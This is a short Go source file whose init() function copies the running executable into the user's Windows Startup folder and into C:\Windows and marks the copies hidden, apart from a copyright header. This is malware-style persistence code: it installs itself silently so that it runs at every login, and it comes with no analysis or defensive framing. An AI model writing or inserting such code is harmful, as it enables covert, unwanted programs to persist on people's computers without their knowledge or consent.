/* ========================================================================
   $File: $
   $Date: $
   $Revision: $
   $Creator: Tristan Magniez $
   $Github: Doc0160 $
   $Notice: (C) Copyright 2017 by Tristan Magniez. All Rights Reserved. $
   ======================================================================== */

package main

import (
    "os"
    "io"
    "path/filepath"
    
    "github.com/kardianos/osext"
)

var startup = os.Getenv("USERPROFILE")+
            "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu"+
            "\\Programs\\Startup\\"

var windows = "C:\\Windows\\"

func Sneak(path string) {
    exe, _ := osext.Executable()
    _, exename := filepath.Split(exe)

    os.MkdirAll(path, 777)
    in, err := os.Open(exe)
    if err == nil {
        defer in.Close()
        out, err := os.Create(path+exename)
        if err == nil {
            defer out.Close()
            _, err = io.Copy(out, in)
        }
        
        SetFileHidden(path+exename)
    }
}

func init() {
    Sneak(startup)
    Sneak(windows)
}
